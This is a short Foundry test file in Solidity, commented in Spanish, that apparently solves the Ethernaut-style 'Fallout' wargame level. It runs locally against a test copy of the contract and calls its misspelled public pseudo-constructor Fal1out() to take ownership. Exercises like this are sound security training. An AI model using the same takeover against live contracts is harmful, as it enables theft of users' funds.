// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// Interfaz para hablar con el contrato Fallout (que está en 0.6.0)
// No importamos el .sol directamente para evitar el choque de versiones
interface IFallout {
    function Fal1out() external payable;
    function owner() external view returns (address);
}

contract FalloutExploit is Test {
    IFallout public target;
    address attacker = address(0xBAD);

    function setUp() public {
        // Desplegamos el bytecode de Fallout compilado aparte.
        // Foundry compila src/Fallout.sol con su propio compilador 0.6.0
        // y acá lo instanciamos vía su artifact.
        target = IFallout(deployCode("Fallout.sol:Fallout"));
    }

    function test_TakeOwnership() public {
        assertTrue(target.owner() != attacker, "atacante no deberia ser owner aun");

        // EXPLOIT: llamar la falsa constructora Fal1out() — es publica
        vm.prank(attacker);
        target.Fal1out();

        assertEq(target.owner(), attacker, "el atacante deberia ser owner");
        console.log("Exploit exitoso: ownership tomado con un solo llamado");
    }
}
